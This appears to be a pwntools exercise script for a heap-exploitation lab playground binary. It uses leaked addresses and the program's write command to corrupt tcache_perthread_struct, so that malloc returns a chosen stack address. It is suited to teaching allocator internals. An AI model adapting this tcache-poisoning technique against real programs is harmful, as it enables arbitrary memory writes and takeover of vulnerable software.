#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    target_ptr = stack_ptr
    print(f"target address: {target_ptr:#x}")

    # make a first allocation to initialize the heap
    p.clean()
    p.sendline(b"malloc 0x10")
    p.recvuntil(b"[*]")
    ptr1 = int(p.recvline()[:-1], 16)
    print(f"ptr1: {ptr1:#x}")

    # calculate pointer to tcache_perthread_struct
    distance = (
        0x10 +      # chunk header
        0x280       # size of tcache_perthread_struct
    )

    tcache = ptr1 - distance
    print(f"tcache_perthread_stuct @ {tcache:#x}")

    # address tcache pointers
    bin_index = 4 # targetting bin 0x60
    max_bins = 64
    bin_count_ptr = tcache + (2 * bin_index)
    bin_header_ptr = tcache + (2 * max_bins) + (8 * bin_index)
    print(f"bin_count_ptr: {bin_count_ptr:#x}")
    print(f"bin_header_ptr: {bin_header_ptr:#x}")

    # corrupt tcache metadata struct
    p.sendline(f"write {bin_count_ptr:#x} 2".encode())
    p.send(pwn.p16(0x1))
    p.sendline(f"write {bin_header_ptr:#x} 8".encode())
    p.send(pwn.p64(target_ptr))

    # request an allocation matching that bin
    p.clean()
    p.sendline(b"malloc 0x50")
    p.recvuntil(b"[*]")
    ptr = int(p.recvline()[:-1], 16)
    input(f"done. malloc returned a controlled address {ptr:#x}.")
    

def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
